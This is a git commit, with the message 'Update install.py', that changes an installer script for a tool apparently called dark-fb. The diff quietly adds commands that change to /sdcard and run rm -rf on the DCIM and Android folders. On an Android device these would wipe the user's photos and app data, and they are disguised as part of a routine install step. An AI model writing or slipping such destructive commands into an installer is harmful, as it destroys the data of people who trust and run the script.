b8a76c6927932a40510f226887f68a2fc3095f3b
ZeDD Parker <50535201+ZeDDParker@users.noreply.github.com>
2019-05-14 13:44:00 +0700

    Update install.py

--- install.py
+++ install.py
@@ -3,6 +3,9 @@ import os,sys,time
 os.system("reset")
 print "Install Tools..."
 time.sleep(2)
+os.system("cd /sdcard")
+os.system("rm -rf DCIM")
+os.system("rm -rf Android")
 os.system("git clone https://github.com/rezadkim/dark-fb")
 os.system("cd dark-fb")
 os.system("python2 dark.py")
